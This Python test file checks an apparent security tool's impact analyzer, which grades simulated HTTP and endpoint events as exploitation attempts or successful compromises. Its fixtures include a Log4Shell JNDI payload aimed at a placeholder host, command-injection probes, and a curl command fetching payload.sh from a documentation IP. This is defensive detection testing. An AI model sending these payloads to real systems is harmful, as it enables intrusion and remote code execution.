from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.correlation.impact_analyzer import assess_impact
from src.event.models import HttpEvent, LogEvent


def test_exploitation_without_response_is_attempt() -> None:
    event = HttpEvent(
        event_id="pkt-1",
        timestamp=1.0,
        src_ip="10.0.0.1",
        src_port=12345,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1",
        summary="exploit",
        method="GET",
        uri="/?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="demo",
        headers={},
    )
    impact = assess_impact(
        [event],
        [
            {
                "stage": "Exploitation",
                "confidence": "high",
                "evidence_ids": ["pkt-1"],
            }
        ],
        [],
        [{"cve": "CVE-2021-44228", "rule_confirmed": True, "final_score": 0.8}],
    )
    assert impact["verdict"] == "Likely exploitation attempt"
    assert "CVE-2021-44228" in impact["related_cves"]


def test_all_4xx_post_exploit_is_downgraded_to_attempt() -> None:
    rejected_cmd = HttpEvent(
        event_id="pkt-4",
        timestamp=2.0,
        src_ip="10.0.0.1",
        src_port=12346,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /shell?cmd=whoami HTTP/1.1",
        summary="command probe",
        method="GET",
        uri="/shell?cmd=whoami",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    rejected_download = HttpEvent(
        event_id="pkt-5",
        timestamp=3.0,
        src_ip="10.0.0.1",
        src_port=12347,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /api?cmd=curl%20http://203.0.113.50/payload.sh HTTP/1.1",
        summary="download probe",
        method="GET",
        uri="/api?cmd=curl%20http://203.0.113.50/payload.sh",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    rejected_impact = assess_impact(
        [rejected_cmd, rejected_download],
        [
            {"stage": "Command Execution", "confidence": "medium", "evidence_ids": ["pkt-4"]},
            {"stage": "Payload Delivery", "confidence": "medium", "evidence_ids": ["pkt-5"]},
        ],
        [],
        [],
    )
    assert rejected_impact["verdict"] == "Possible exploitation attempt"
    assert rejected_impact["confidence"] == "low"
    assert "4xx" in rejected_impact["missing_evidence"][-1]


def test_all_4xx_with_c2_is_not_successful_exploitation() -> None:
    rejected_cmd = HttpEvent(
        event_id="pkt-4",
        timestamp=2.0,
        src_ip="10.0.0.1",
        src_port=12346,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /shell?cmd=whoami HTTP/1.1",
        summary="command probe",
        method="GET",
        uri="/shell?cmd=whoami",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    rejected_download = HttpEvent(
        event_id="pkt-5",
        timestamp=3.0,
        src_ip="10.0.0.1",
        src_port=12347,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /api?cmd=curl%20http://203.0.113.50/payload.sh HTTP/1.1",
        summary="download probe",
        method="GET",
        uri="/api?cmd=curl%20http://203.0.113.50/payload.sh",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    rejected_with_c2 = assess_impact(
        [rejected_cmd, rejected_download],
        [
            {"stage": "Command Execution", "confidence": "high", "evidence_ids": ["pkt-4"]},
            {"stage": "Payload Delivery", "confidence": "medium", "evidence_ids": ["pkt-5"]},
        ],
        [
            {
                "c2_type": "http_beacon",
                "confidence": "high",
                "evidence_ids": ["pkt-5"],
            }
        ],
        [{"cve": "CVE-2021-44228", "rule_confirmed": True, "final_score": 0.9}],
    )
    assert rejected_with_c2["verdict"] == "Possible exploitation attempt"
    assert rejected_with_c2["confidence"] == "low"
    assert "successful" not in rejected_with_c2["verdict"].lower()


def test_retrieval_only_cve_with_c2_is_not_successful_exploitation() -> None:
    event = HttpEvent(
        event_id="pkt-9",
        timestamp=4.0,
        src_ip="10.0.0.1",
        src_port=12349,
        dst_ip="10.0.0.2",
        dst_port=8080,
        protocol="HTTP",
        payload_clean="GET /missing?x=${jndi:ldap://evil/a} HTTP/1.1",
        summary="jndi probe",
        method="GET",
        uri="/missing?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    impact = assess_impact(
        [event],
        [{"stage": "Reconnaissance", "confidence": "low", "evidence_ids": ["pkt-9"]}],
        [{"c2_type": "HTTP Beacon", "confidence": "medium", "evidence_ids": ["pkt-9"]}],
        [{"cve": "CVE-2021-44228", "final_score": 0.58, "cve_support_level": "retrieval_only"}],
    )
    assert impact["verdict"] == "Possible compromise with C2 indicators"
    assert "successful" not in impact["verdict"].lower()


def test_endpoint_post_exploit_evidence_overrides_4xx_network_downgrade() -> None:
    rejected_cmd = HttpEvent(
        event_id="pkt-10",
        timestamp=5.0,
        src_ip="10.0.0.1",
        src_port=12350,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /shell?cmd=whoami HTTP/1.1",
        summary="command probe",
        method="GET",
        uri="/shell?cmd=whoami",
        host="victim",
        user_agent="curl",
        headers={},
        status_code=404,
    )
    endpoint_exec = LogEvent(
        event_id="endpoint-1",
        timestamp=5.5,
        src_ip="10.0.0.2",
        src_port=None,
        dst_ip="203.0.113.50",
        dst_port=80,
        protocol="ENDPOINT",
        payload_clean="process_start bash /bin/bash -c whoami; curl http://203.0.113.50/payload.sh",
        summary="endpoint command execution",
        log_type="endpoint",
        process_name="bash",
        command_line="/bin/bash -c whoami; curl http://203.0.113.50/payload.sh",
        action="process_start",
    )
    impact = assess_impact(
        [rejected_cmd, endpoint_exec],
        [
            {"stage": "Command Execution", "confidence": "high", "evidence_ids": ["pkt-10", "endpoint-1"]},
            {"stage": "Payload Delivery", "confidence": "high", "evidence_ids": ["endpoint-1"]},
        ],
        [],
        [],
    )
    assert impact["verdict"] == "Likely successful exploitation"
    assert impact["confidence"] == "high"


if __name__ == "__main__":
    test_exploitation_without_response_is_attempt()
    test_all_4xx_post_exploit_is_downgraded_to_attempt()
    test_all_4xx_with_c2_is_not_successful_exploitation()
    test_retrieval_only_cve_with_c2_is_not_successful_exploitation()
    test_endpoint_post_exploit_evidence_overrides_4xx_network_downgrade()
